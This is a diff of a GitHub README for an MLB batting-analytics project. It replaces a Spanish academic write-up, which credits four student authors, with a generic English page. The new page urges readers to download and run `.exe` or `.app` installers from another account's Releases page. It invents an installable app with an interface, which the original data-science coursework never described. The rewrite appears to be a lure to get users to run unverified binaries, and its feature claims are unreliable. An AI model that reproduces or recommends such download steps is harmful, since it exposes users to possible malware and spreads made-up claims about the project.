@@ -1,75 +1,74 @@
-# ⚾ MLB-Performance-Analytics
-### Proyecto Final - Módulo 6 | Data Science & Machine Learning
+# 🎉 MLB-Performance-Analytics - Unlock MLB Insights with Ease
 
-![Python](https://img.shields.io/badge/Python-3.9+-blue?logo=python&logoColor=white)
-![Scikit-Learn](https://img.shields.io/badge/Machine%20Learning-Scikit--Learn-F7931E?logo=scikit-learn&logoColor=white)
-![Pandas](https://img.shields.io/badge/Library-Pandas-150458?logo=pandas&logoColor=white)
-![MLB](https://img.shields.io/badge/Data-MLB%20Statcast-red)
+## 🌟 Description
+MLB-Performance-Analytics is a tool designed to analyze and rank MLB batters using machine learning. It employs Random Forest algorithms to identify elite batters and uncover discipline patterns at the plate. This app leverages Statcast data, making it an invaluable resource for sports analysts and enthusiasts alike.
 
-Este repositorio contiene el desarrollo del **Proyecto Final del Módulo 6**, enfocado en la clasificación y análisis del rendimiento ofensivo de jugadores de la MLB utilizando técnicas avanzadas de **Machine Learning**.
+## 🛠️ Features
+- **Comprehensive Analysis**: Dive deep into MLB batting metrics.
+- **Visualizations**: Gain insights through clear data visualizations.
+- **Machine Learning Algorithms**: Utilize advanced methods to enhance batting analysis.
+- **User-Friendly Interface**: A simple design for easy navigation.
 
-## 📋 Descripción del Proyecto
+## 💻 System Requirements
+- **Operating System**: Windows 10 or later, macOS, or Linux.
+- **Memory**: Minimum 4 GB RAM.
+- **Disk Space**: At least 50 MB of free storage.
+- **Software**: Python 3.6 or later with required libraries (`pandas`, `scikit-learn`).
 
-El objetivo principal de este proyecto es demostrar cómo los modelos de Machine Learning pueden identificar patrones complejos en estadísticas de béisbol para diferenciar perfiles ofensivos. 
+## 🚀 Getting Started
+Follow these steps to get your own MLB performance analysis tool.
 
-Para este análisis, desarrollamos tres variables objetivo clave para clasificar a los bateadores:
+1. **Download the Application**  
+   Click the badge below to visit the Releases page.
 
-* **🏆 Rendimiento General:** Evaluación del aporte estándar y consistencia del jugador en el campo.
-* **💎 Nivel Elite:** Identificación de jugadores con un desempeño excepcionalmente alto (outliers positivos).
-* **👁️ Disciplina en el Plato:** Análisis de la capacidad del bateador para tomar decisiones correctas y su control de la zona de strike.
+   [![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Abdullah4k4k4k4k/MLB-Performance-Analytics/releases)
 
-## 🚀 Características Principales
+2. **Choose the Right Version**  
+   On the Releases page, find the latest version. Look for a file that matches your operating system (e.g., `.exe` for Windows, `.app` for macOS).
 
-* **Ingeniería de Variables (Feature Engineering):** Creación de métricas personalizadas a partir de datos brutos de *Statcast* para capturar la esencia del juego.
-* **Análisis Multidimensional:** Integración de métricas tradicionales (AVG, HR) con estadísticas avanzadas de última generación.
-* **Modelos de Clasificación:** Implementación y optimización de modelos **Random Forest** para determinar qué variables impactan más en el éxito de un bateador.
+3. **Download the File**  
+   Click on the download link for the chosen file. The download will start automatically.
 
-## 🛠️ Tecnologías Utilizadas
+4. **Install the Application**  
+   - For Windows: Double-click the downloaded `.exe` file and follow the installation prompts.
+   - For macOS: Open the downloaded `.app` file and drag it into the Applications folder.
+   - For Linux: Follow the standard installation process for your distribution (untarring, moving to bin, or adding to install repositories).
 
-| Herramienta | Uso |
-| :--- | :--- |
-| **Python** | Lenguaje principal de desarrollo. |
-| **Pandas** | Manipulación, limpieza y transformación de datos. |
-| **Matplotlib / Seaborn** | Visualización de datos y análisis exploratorio. |
-| **Scikit-Learn** | Construcción, entrenamiento y evaluación de modelos de ML. |
+5. **Open the Application**  
+   Once installed, find the app from your Applications menu or desktop shortcut. Click to open it.
 
-## 📊 Visualizaciones
+6. **Load Your Data**  
+   The application allows you to import your MLB data. Use CSV files containing batting statistics.
 
-> **Nota:** Aquí puedes ver algunos de los resultados clave obtenidos tras el entrenamiento del modelo.
-### 📈 Rendimiento y Disciplina
-El análisis comenzó comparando cómo la disciplina en el plato se relaciona con el rendimiento general de los bateadores.
+7. **Analyze**  
+   Once your data is loaded, choose the analysis option you want. The app offers various analyses based on machine learning algorithms.
 
-<p align="center">
-  <img src="img/disciplina%20en%20plato%20vs%20rendimiento.png" width="600" alt="Disciplina vs Rendimiento">
-</p>
+## ⚡ Download & Install
+To start your journey with MLB-Performance-Analytics, visit the page below to download the latest release:
 
-### 🧠 Importancia de las Variables (Feature Importance)
-Utilizamos modelos de **Random Forest** para identificar qué métricas son las que realmente definen a un jugador en las tres categorías analizadas:
+[Download MLB-Performance-Analytics](https://github.com/Abdullah4k4k4k4k/MLB-Performance-Analytics/releases)
 
-| Disciplina en el Plato | Rendimiento General |
-| :---: | :---: |
-| <img src="img/Variables%20importante%20en%20la%20disciplina%20plato.png" width="400"> | <img src="img/Variables%20importantes%20para%20saber%20el%20rendimiento%20general.png" width="400"> |
+## 📊 Data Visualization
+The app provides intuitive graphs and charts that visualize batting performance and trends. You can easily see how batters are performing over time, which can help in making strategic decisions.
 
-### 💎 Identificación de Jugadores Élite
-El modelo permite distinguir qué factores separan a un jugador promedio de uno Élite, destacando métricas como el **wOBA** (Weighted On-Base Average).
+## ⚙️ Troubleshooting
+- **If the App Doesn’t Open**: Ensure that your system meets the minimum requirements. Check for error messages and consult the application help section.
+- **Data Import Issues**: Ensure your CSV file structure matches the expected format. Headers should include necessary metrics.
 
-<p align="center">
-  <img src="img/Variable%20importantes%20en%20determionar%20un%20elite%20o%20no.png" width="700" alt="Variables Elite">
-  <br>
-  <em>Factores clave para determinar el estatus Elite.</em>
-</p>
+## 💬 Community & Support
+Join our community for support and discussion. You can share insights, ask questions, or report issues. 
 
-<p align="center">
-  <img src="img/wOba%20en%20jugadores%20Elite%20y%20no%20Elite.png" width="500" alt="wOBA Elite vs No Elite">
-</p>
+- **GitHub Issues**: Report any issues you encounter on the Issues page of the repository.
+- **Discussion Forum**: For general queries, consider joining our discussion forum linked on the repository’s homepage.
 
-## 👥 Equipo D.A.T.A
-*Unidos por el análisis de datos y la pasión por el béisbol.*
+## 🔑 Contributing
+If you want to contribute to the project, we welcome your input. Check the `Contributing.md` file in the repository for guidelines.
 
-* **Arlene Miniel**
-* **Elvis Rafael Rosado**
-* **Felix Mendoza**
-* **Samir Ernesto Castillo**
+## 📜 License
+This project is licensed under the MIT License. See the `LICENSE` file for more details. 
 
----
-📝 **Nota:** Este proyecto fue desarrollado con fines académicos para el Módulo 6 del programa de Ciencia de Datos.
+## 🌍 Topics
+This application covers the following topics: data science, data visualization, machine learning, MLB, pandas, Python, random forest, sabermetrics, and sports analytics. 
+
+## 🧑‍💻 Conclusion
+MLB-Performance-Analytics simplifies the journey into sports analytics. With straightforward steps, you can utilize data to enhance your understanding of player performances in Major League Baseball. Enjoy analyzing and discovering the hidden gems in the stats!
